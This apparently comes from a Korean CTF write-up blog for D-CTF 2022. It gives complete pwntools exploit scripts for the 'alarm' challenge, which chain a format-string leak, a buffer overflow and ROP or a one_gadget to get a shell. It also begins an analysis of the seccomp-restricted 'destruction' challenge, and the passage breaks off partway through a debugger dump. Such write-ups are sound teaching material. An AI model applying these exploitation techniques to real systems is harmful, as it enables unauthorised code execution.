Ìï† Ïàò ÏûàÎäîÍ≤å ÍµâÏû•Ìûà ÎßéÎã§. ÏòàÎ•º Îì§Î©¥ Ïä§ÌÉù Í∞í ÎÖ∏Ï∂ú Ï†ïÎèÑ?</p><p>Ïù¥ Î¨∏Ï†úÏóêÏÑ† bofÎ•º Ìä∏Î¶¨Í±∞ÌïòÍ≥† ÏûëÏÑ±Ìï† Ïàò ÏûàÎäî Î∞îÏù¥Ìä∏ ÏàòÍ∞Ä ÍµâÏû•Ìûà ÎÑâÎÑâÌïòÍ≥†, canaryÎèÑ Ï°¥Ïû¨ÌïòÏßÄ ÏïäÏïÑ bofÎßå Ïûò Ìä∏Î¶¨Í±∞ ÎêúÎã§Î©¥ Î¨¥Î¶¨ÏóÜÏù¥ ROPÎ•º ÏßÑÌñâÌï† Ïàò ÏûàÏùÑ Í≤ÉÏù¥Îã§.</p><p>bofÎ•º Ìä∏Î¶¨Í±∞ÌïòÍ∏∞ ÏúÑÌïú Ï°∞Í±¥ÏùÄ ÎûúÎç§ Í∞íÏùÑ ÏùºÏπòÏãúÏºúÏïºÌïòÎäî Í≤ÉÏù∏Îç∞, Ïù¥ ÎûúÎç§ Í∞íÏùÄ Ïä§ÌÉùÏóê Ï†ÄÏû•ÎêúÎã§. Îî∞ÎùºÏÑú fsbÎ°ú ÎûúÎç§ Í∞íÏùÑ ÏïåÏïÑÎÇº Ïàò ÏûàÎã§. </p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="ÏãúÎÇòÎ¶¨Ïò§"><a href="#ÏãúÎÇòÎ¶¨Ïò§" class="headerlink" title="ÏãúÎÇòÎ¶¨Ïò§"></a>ÏãúÎÇòÎ¶¨Ïò§</h3><ol><li>fsbÎ•º Ïù¥Ïö©ÌïòÏó¨ ÎûúÎç§ Í∞íÍ≥º libc base Íµ¨ÌïòÍ∏∞</li><li>ÎûúÎç§ Í∞íÏùÑ ÏûÖÎ†•ÌïòÏó¨ bof Ìä∏Î¶¨Í±∞</li><li>ROP!</li></ol><h3 id="Exploit-Code-local-Ubuntu-20-04"><a href="#Exploit-Code-local-Ubuntu-20-04" class="headerlink" title="Exploit Code (local, Ubuntu 20.04)"></a>Exploit Code (local, Ubuntu 20.04)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./alarm&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;34.159.80.143&#x27;, 31776)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./alarm&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;system!&#x27;</span>, <span class="string">&#x27;%p %9$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">leak = p.recvline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"></span><br><span class="line">libc_leak = leak[<span class="number">0</span>]</span><br><span class="line">random_leak = leak[<span class="number">1</span>][:-<span class="number">1</span>] </span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;libc_leak :: &#x27;</span> + libc_leak)</span><br><span class="line">log.info(<span class="string">&#x27;random_leak :: &#x27;</span> + random_leak)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;alarm:&#x27;</span>, random_leak)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(libc_leak,<span class="number">16</span>) - <span class="number">131</span> - libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">ret = libc_base + <span class="number">0x22679</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x23b6a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> </span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"><span class="comment">#payload += &#x27;C&#x27; * 8 # ret</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="find-libc"><a href="#find-libc" class="headerlink" title="find libc"></a>find libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ÎûúÎç§ Í∞í Ï†ÑÏÜ° ÌõÑ</span></span><br><span class="line">ret = <span class="number">0x40067e</span></span><br><span class="line">pop_rdi = <span class="number">0x400a23</span></span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = <span class="number">0x400690</span> <span class="comment">#e.plt[&#x27;puts&#x27;]</span></span><br><span class="line">open_got = e.got[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> </span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got) <span class="comment"># open_got</span></span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;leak addr: &#x27;</span> + <span class="built_in">hex</span>(leak_addr))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts: 970</span><br><span class="line">open: bf0</span><br></pre></td></tr></table></figure><p>libc database site: <a href="https://libcdb.konwur.de/">https://libcdb.konwur.de/</a></p><p>ÏµúÏ¢ÖÏ†ÅÏúºÎ°ú Íµ¨Ìïú libc version: <code>libc6_2.27-3ubuntu1.6_amd64.so</code></p><h3 id="Exploit-Code-remote-Ubuntu-18-04"><a href="#Exploit-Code-remote-Ubuntu-18-04" class="headerlink" title="Exploit Code (remote, Ubuntu 18.04)"></a>Exploit Code (remote, Ubuntu 18.04)</h3><p>remote libcÍ∞Ä Ubuntu 18.04Ïùò libc Î≤ÑÏ†ÑÏù¥ÎùºÏÑú ÏõêÍ∞ÄÏ†ØÏùÑ Î¨¥Î¶¨ÏóÜÏù¥ ÏÇ¨Ïö©Ìï† Ïàò ÏûàÏóàÎã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./alarm&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.159.80.143&#x27;</span>, <span class="number">31776</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./alarm&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;system!&#x27;</span>, <span class="string">&#x27;%11$p %9$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">leak = p.recvline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"></span><br><span class="line">libc_leak = leak[<span class="number">0</span>]</span><br><span class="line">random_leak = leak[<span class="number">1</span>][:-<span class="number">1</span>] </span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;libc_leak :: &#x27;</span> + libc_leak)</span><br><span class="line">log.info(<span class="string">&#x27;random_leak :: &#x27;</span> + random_leak)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;alarm:&#x27;</span>, random_leak)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(libc_leak,<span class="number">16</span>) - <span class="number">231</span> - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40067e</span></span><br><span class="line">oneshot = libc_base+<span class="number">0x4f302</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> </span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"><span class="comment">#payload += p64(pop_rdi)</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(oneshot)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>ÏÇ¨Ïã§ Ïù¥ ÎåÄÌöå Í∏∞Í∞Ñ Îïå libc version Íµ¨ÌïòÍ≥† mainÏúºÎ°ú ÎèåÎ†§ÏÑú(?) Î≠ê Ïù¥Í≤ÉÏ†ÄÍ≤É ÏÇΩÏßàÌïòÎã§Í∞Ä Î™ªÌíÄÏóàÎã§ „Öã„Öã;; mainÏúºÎ°ú ÎèåÎ¶¨ÎãàÍπê ripÍ∞Ä Îß® Ï≤òÏùå Î≥¥ÎÇ¥Ï§Ä ÎûúÎç§ Í∞íÏúºÎ°ú Î∞îÎÄåÏñ¥ÏÑú Îã§Î•∏ ÏùºÏùÑ Ïû†Íπê ÌïòÎü¨ Í∞îÎã§. Í∑∏Îü∞ ÏÇ¨Ïù¥ ÎåÄÌöåÍ∞Ä Ï¢ÖÎ£åÎêòÏñ¥ÏÑú ÏÑúÎ≤ÑÍ∞Ä Î∞îÎ°ú Îã´ÌòÄÎ≤ÑÎ†§ÏÑú remote shellÏùÄ Îî∞ÏßÄ Î™ªÌïòÏòÄÎã§. ÌõÑ..</p><p>Ï∞ΩÎèÑ Îã§ Îã´ÏïÑÎ≤ÑÎ†§ÏÑú libc Î≤ÑÏ†ÑÎèÑ ÍπåÎ®πÏóàÍ≥†, ÏÑúÎ≤ÑÎèÑ Îã´ÌòÄÏÑú offsetÎèÑ Íµ¨Ìï† Ïàò ÏóÜÏñ¥ÏÑú ÎîîÏΩîÏóê Ï°∞Ïã¨Ïä§ÎüΩÍ≤å libc Î≤ÑÏ†ÑÏùÑ Î¨ºÏñ¥Î¥§ÎçîÎãà <code>libc6_2.27-3ubuntu1.6_amd64.so</code> ÎùºÍ≥† ÏπúÏ†àÌïòÍ≤å ÏïåÎ†§Ï£ºÏÖ®Îã§. Í∑∏ÎûòÏÑú Î∞îÏù¥ÎÑàÎ¶¨Î•º patchÌïòÍ≥† ÌíÄÏñ¥Î≥¥ÏïòÎã§. </p><p>ÏÇ¨Ïã§ Ïù¥ Í≥ºÏ†ïÏóêÏÑú ÏÉàÎ°úÏö¥ ÏÇ¨Ïã§ÏùÑ ÏïåÍ≤å ÎêòÏóàÎã§.</p><p>ÏïåÎ†§Ï£ºÏã† libc Î≤ÑÏ†ÑÏùÄ Ubuntu 18.04Í≥º ÎèôÏùºÌïòÎã§. Í∑∏ÎûòÏÑú Ubuntu 18.04ÏóêÏÑú libcÏôÄ ldÎ•º Í∞ÄÏ†∏ÏôîÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ ldd alarm</span><br><span class="line">linux-vdso.so.1 (0x00007fff621e2000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f05fa6c9000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f05fa8cf000)</span><br><span class="line"></span><br><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ ls</span><br><span class="line">alarm  ld-2.27.so  libc-2.27.so  local.py  remote.py</span><br></pre></td></tr></table></figure><p>patchÎ•º ÌïòÎ†§ÎäîÎç∞ Ïûò ÏïàÎêòÏñ¥ÏÑú ÏïåÏïÑÎ≥¥ÎãàÍπå libc Ïù¥Î¶ÑÏùÑ <code>libc.so.6</code>ÏúºÎ°ú Î≥ÄÍ≤ΩÌï¥ÏïºÌïòÎçîÎùº.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ patchelf --set-rpath . --set-interpreter ./ld-2.27.so alarm</span><br><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ cp libc-2.27.so libc.so.6</span><br><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ patchelf --set-rpath . --replace-needed libc.so.6 ./libc.so.6 alarm</span><br><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ ldd alarm</span><br><span class="line">linux-vdso.so.1 (0x00007ffd5c699000)</span><br><span class="line">./libc.so.6 (0x00007f32d2251000)</span><br><span class="line">./ld-2.27.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f32d2644000)</span><br></pre></td></tr></table></figure><p>Ïù¥Î†áÍ≤å remoteÏùò Î∞îÏù¥ÎÑàÎ¶¨Î°ú patchÌï¥ÏÑú remoteÎ•º Ïûò Ìï¥Í≤∞Ìï† Ïàò ÏûàÏóàÎã§.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> D-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> one_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DefCamp Capture the Flag (D-CTF) 2022 - destruction (seccomp, shellcode)</title>
      <link href="/221005-d-ctf2022-destruction/"/>
      <url>/221005-d-ctf2022-destruction/</url>
      
        <content type="html"><![CDATA[<p>Î∂ÑÏÑù ÌôòÍ≤Ω: Windows 11, Ubuntu 20.04<br>ÏÇ¨Ïö©Ïûê Ï†úÍ≥µ ÌååÏùº: Î∞îÏù¥ÎÑàÎ¶¨</p><p>Ìï¥Îãπ ctfÏóê pwnÏù¥ Îëê Î¨∏Ï†ú ÎÇòÏôîÎã§. Ïù¥Í±¥ hardÏù¥Îã§.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Î≥¥Ìò∏-Í∏∞Î≤ï"><a href="#Î≥¥Ìò∏-Í∏∞Î≤ï" class="headerlink" title="Î≥¥Ìò∏ Í∏∞Î≤ï"></a>Î≥¥Ìò∏ Í∏∞Î≤ï</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>ÏïÑÎ¨¥Í≤ÉÎèÑ ÏïàÍ±∏Î†§ÏûàÎã§. Ïä§ÌÉùÏóêÏÑú ÏâòÏΩîÎìúÎèÑ Ïã§ÌñâÏù¥ Í∞ÄÎä•ÌïòÎã§. ÌïòÏßÄÎßå <code>seccomp</code>Ïù¥ Í±∏Î†§ÏûàÏßÄ.. ÏâòÏΩîÎìú Ïã§ÌñâÏù¥ ÏÑ†ÌÉùÏ†ÅÏúºÎ°ú Í∞ÄÎä•ÌïòÎã§.</p><h3 id="Ï∑®ÏïΩÏ†ê"><a href="#Ï∑®ÏïΩÏ†ê" class="headerlink" title="Ï∑®ÏïΩÏ†ê"></a>Ï∑®ÏïΩÏ†ê</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">3</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Acces denied intruder detected!!&quot;</span>);</span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  seccomp();</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x38</span>uLL) &lt;= <span class="number">0</span> )             <span class="comment">// bof</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(<span class="string">&quot;done&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf, <span class="number">4uLL</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ï∑®ÏïΩÏ†êÏùÄ Í∞ÑÎã®ÌïòÎã§. Î∞îÎ°ú bofÍ∞Ä Î∞úÏÉùÌïòÎäî Í≤ÉÏùÑ Ìïú ÎààÏóê Ï∞æÏïÑÎ≥º Ïàò ÏûàÎã§.</p><p>Í∑∏Î¶¨Í≥† Ïù¥ Î∞îÏù¥ÎÑàÎ¶¨ÏóêÏÑú Ï§ëÏöîÌïú Ï†êÏùÄ seccomp Ìï®ÏàòÍ∞Ä Ï†ïÏùòÎêòÏñ¥ ÏûàÎã§Îäî ÏÇ¨Ïã§Ïù¥Îã§. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;prctl(NO_NEW_PRIVS)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;prctl(SECCOMP)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *__errno_location() == <span class="number">22</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;SECCOMP_FILTER is not available. :(&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !*__errno_location() )</span><br><span class="line">  __asm &#123; jmp     rsp &#125;</span><br></pre></td></tr></table></figure><p><code>seccomp-tools</code>ÏùÑ Ïù¥Ïö©ÌïòÏó¨ Ìé∏Î¶¨ÌïòÍ≤å ÌôïÏù∏Ìï¥Î≥¥Ïûê.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/dctf/destruction$ seccomp-tools dump ./destruction </span><br><span class="line">Acces denied intruder detected!!</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p><code>open</code>, <code>read</code>, <code>exit</code>, <code>write</code> syscallÏùÑ ÏÇ¨Ïö©Ìï† Ïàò ÏûàÎã§.<br>Ï¶â,.. ÏâòÏùÑ Îî∞Îäî Î¨∏Ï†úÍ∞Ä ÏïÑÎãàÎùº flagÎ•º ORW Ìï¥ÏïºÌïòÎäî Î¨∏Ï†úÏù¥Îã§. </p><p>ÏûÖÎ†•Ìï† Ïàò ÏûàÎäî Î∞îÏù¥Ìä∏Í∞Ä 0x38Ïù∏Îç∞ Î∞òÌï¥ <code>buf</code> ÌÅ¨Í∏∞Í∞Ä 0x20Ïù¥Îã§. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ REGISTERS ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span><br><span class="line">*RAX  0x0</span><br><span class="line"> RBX  0x400910 ‚óÇ‚Äî push   r15</span><br><span class="line">*RCX  0xfff0</span><br><span class="line">*RDX  0x4</span><br><span class="line">*RDI  0x400a09 ‚óÇ‚Äî outsd  dx, dword ptr fs:[rsi] /* &#x27;done&#x27; */</span><br><span class="line"> RSI  0x7ffeb916ffe0 ‚óÇ‚Äî 0x41414100656e6f64 /* &#x27;done&#x27; */</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x7c</span><br><span class="line"> R10  0xfffffffffffff40f</span><br><span class="line">*R11  0x4</span><br><span class="line"> R12  0x4005c0 ‚óÇ‚Äî xor    ebp, ebp</span><br><span class="line"> R13  0x7ffeb91700f0 ‚óÇ‚Äî 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line">*RBP  0x4141414141414141 (&#x27;AAAAAAAA&#x27;)</span><br><span class="line">*RSP  0x7ffeb9170008 ‚óÇ‚Äî 0x4242424242424242 (&#x27;BBBBBBBB&#x27;)</span><br><span class="line">*RIP  0x40090a ‚óÇ‚Äî ret    </span><br><span 